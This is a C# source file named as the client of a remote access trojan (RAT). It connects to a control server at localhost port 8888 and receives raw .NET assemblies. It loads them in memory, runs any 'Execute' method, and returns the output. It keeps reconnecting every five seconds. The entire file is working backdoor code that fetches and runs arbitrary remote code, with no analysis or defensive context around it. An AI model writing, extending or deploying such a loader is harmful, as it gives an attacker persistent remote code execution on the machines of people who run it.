using System;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;

namespace RATClient
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient("localhost", 8888);
                    Console.WriteLine("[Connected to server]");
                    while (true)
                    {
                        byte[] buffer = new byte[sizeof(int)];
                        int bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
                        int assemblyLength = BitConverter.ToInt32(buffer, 0);
                        buffer = new byte[assemblyLength];
                        bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
                        Assembly assembly = Assembly.Load(buffer);
                        foreach (Type type in assembly.GetExportedTypes())
                        {
                            MethodInfo method = type.GetMethod("Execute");
                            if (method != null)
                            {
                                try
                                {
                                    object instance = Activator.CreateInstance(type);
                                    object result = method.Invoke(instance, null);
                                    byte[] responseBytes = Encoding.ASCII.GetBytes(result.ToString());
                                    client.GetStream().Write(responseBytes, 0, responseBytes.Length);
                                }
                                catch (Exception ex)
                                {
                                    byte[] errorBytes = Encoding.ASCII.GetBytes("Error: " + ex.ToString());
                                    client.GetStream().Write(errorBytes, 0, errorBytes.Length);
                                }
                                break;
                            }
                        }
                    }
                    client.Close();
                }
                catch (Exception)
                {
                    Console.WriteLine("\nReconnecting...");
                    Thread.Sleep(5000);
                }
            }
        }
    }
    public interface IPlugin
    {
        string Execute();
    }
}
